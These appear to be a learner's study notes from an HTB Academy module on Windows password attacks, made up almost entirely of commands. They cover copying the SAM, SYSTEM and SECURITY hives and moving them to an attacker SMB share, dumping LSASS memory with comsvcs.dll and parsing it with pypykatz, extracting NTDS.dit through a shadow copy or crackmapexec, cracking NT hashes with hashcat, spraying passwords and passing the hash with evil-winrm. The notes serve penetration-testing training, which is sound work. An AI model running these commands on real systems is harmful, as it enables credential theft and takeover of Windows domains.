## HTB-ACADEMY (Passsword attacks / Windows)
## Ivan Medina
---

### Windows Local Password Attacks

##### **SAM Registry Hives**

| Registry Hive   |      Description      |
|----------|:-------------:|
| hklm\sam |	Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
| hklm\system |	Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.|
| hklm\security |	Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.|

##### **Using reg.exe save to Copy Registry Hives**

- ```reg.exe save hklm\sam C:\sam.save```
- ```reg.exe save hklm\system C:\system.save```
- ```reg.exe save hklm\security C:\security.save```

##### **Creating a Share with smbserver.py**

```sudo python3 impacket-smbserver.py -smb2support CompData /home/user/Documents/```

##### **Move hives**

- ```move sam.save \\<ip>\CompData```
- ```move security.save \\<ip>\CompData```
- ```move system.save \\<ip>\CompData```


##### **Dumping Hashes with Impacket's secretsdump.py**

- ```python3 impacket-secretsdump.py -sam sam.save -security security.save -system system.save LOCAL```

##### **Cracking Hashes with Hashcat**

- ```sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt```

### Remote Dumping & LSA Secrets Considerations

With access to credentials with local admin privileges, it is also possible for us to target LSA Secrets over the network. 

##### **Dumping LSA Secrets Remotely**

```crackmapexec smb <ip> --local-auth -u <user> -p <password> --lsa```

##### **Dumping SAM Remotely**

```crackmapexec smb <ip> --local-auth -u <user> -p <password> --sam```

### Attacking LSASS

LSASS is a critical service that plays a central role in credential management and the authentication processes in all Windows operating systems.

Upon initial logon, LSASS will:

- Cache credentials locally in memory
- Create access tokens
- Enforce security policies
- Write to Windows security log

##### **Dumping LSASS Process Memory**

##### *Task Manager Method*

With access to an interactive graphical session with the target, we can use task manager to create a memory dump.

```Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file```

And is created in ... ```C:\Users\<user>\AppData\Local\Temp```

##### *Rundll32.exe & Comsvcs.dll Method*

```tasklist /svc```

##### *Finding LSASS PID in PowerShell*

```Get-Process lsass```

Once we have the PID assigned to the LSASS process, we can create the dump file

##### *Creating lsass.dmp using PowerShell*

```rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full```

##### **Using Pypykatz to Extract Credentials**

The command initiates the use of pypykatz to parse the secrets hidden in the LSASS process memory dump

```pypykatz lsa minidump /home/peter/Documents/lsass.dmp```

##### *MSV*

>"MSV is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the SID, Username, Domain, and even the NT & SHA1 password hashes associated with the bob user account's logon session stored in LSASS process memory"

##### *WDIGEST*

"WDIGEST is an older authentication protocol enabled by default in Windows XP - Windows 8 and Windows Server 2003 - Windows Server 2012. LSASS caches credentials used by WDIGEST in clear-text."

##### *Kerberos*

>"Kerberos is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time."

##### *DPAPI*

>"The Data Protection Application Programming Interface or DPAPI is a set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications."

Is used by: Internet Explorer, Google Chrome, Outlook, RDP, Credential Manager.

##### **Cracking the NT Hash with Hashcat**

```sudo hashcat -m 1000 <hash> /usr/share/wordlists/rockyou.txt```

### Attacking Active Directory & NTDS.dit

##### **Dictionary Attacks against AD accounts using CrackMapExec**

##### *Creating a Custom list of Usernames*

```./username-anarchy -i /home/path/names.txt```

##### *Launching the Attack with CrackMapExec*

```crackmapexec smb <ip> -u <user> -p <wordlist>```

##### **Capturing NTDS.dit**

>"NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. Recall that NTDS.dit file is stored at %systemroot$/ntds on the domain controllers in a forest. The .dit stands for directory information tree".

##### *Connecting to a DC with Evil-WinRM*

```evil-winrm -i <ip>  -u <user> -p <password>```

##### *Checking Local Group Membership*

```net localgroup```

##### *Checking User Account Privileges including Domain*

```net user bwilliamson```

##### *Creating Shadow Copy of C:*

```vssadmin CREATE SHADOW /For=C:```

##### *Copying NTDS.dit from the VSS*

```cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit```

##### *Transferring NTDS.dit to Attack Host*

```cmd.exe /c move C:\NTDS\NTDS.dit \\<ip>\<shared_folder>```

##### *A Faster Method: Using cme to Capture NTDS.dit*

```crackmapexec smb <ip> -u <user> -p <password> --ntds```

##### **Cracking Hashes & Gaining Credentials**


##### *Cracking a Single Hash with Hashcat*

```sudo hashcat -m 1000 <hash> <dict>```

##### *Pass-the-Hash*

```evil-winrm -i <ip>  -u  <user> -H "<hash>"```
